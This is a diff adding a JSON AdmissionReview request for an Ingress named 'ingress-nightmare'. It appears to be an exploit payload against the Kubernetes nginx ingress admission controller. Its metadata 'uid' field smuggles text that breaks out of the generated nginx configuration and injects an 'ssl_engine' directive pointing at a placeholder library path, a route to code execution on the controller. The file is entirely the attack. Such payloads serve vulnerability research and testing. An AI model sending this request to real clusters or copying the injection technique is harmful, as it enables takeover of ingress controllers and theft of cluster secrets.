@@ -1,0 +1,65 @@
+{
+  "kind": "AdmissionReview",
+  "apiVersion": "admission.k8s.io/v1",
+  "request": {
+    "uid": "8750862f-46f5-4c21-b1f4-d3b66ccd997f",
+    "kind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "resource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "requestKind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "requestResource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "name": "ingress-nightmare",
+    "operation": "UPDATE",
+    "object": {
+      "kind": "Ingress",
+      "apiVersion": "networking.k8s.io/v1",
+      "metadata": {
+        "name": "ingress-nightmare",
+        "creationTimestamp": null,
+        "uid": "uid {}\nset $proxy_alternative_upstream_name \"\";\n}\n}\nssl_engine <PATH>;\n",
+        "annotations": {
+          "nginx.ingress.kubernetes.io/mirror-host": "test",
+          "nginx.ingress.kubernetes.io/mirror-target": "target"
+        }
+      },
+      "spec": {
+        "rules": [
+          {
+            "http": {
+              "paths": [
+                {
+                  "path": "/",
+                  "pathType": "Prefix",
+                  "backend": {
+                    "service": {
+                      "name": "nginx",
+                      "port": {
+                        "number": 80
+                      }
+                    }
+                  }
+                }
+              ]
+            }
+          }
+        ],
+        "ingressClassName": "nginx"
+      }
+    }
+  }
+}
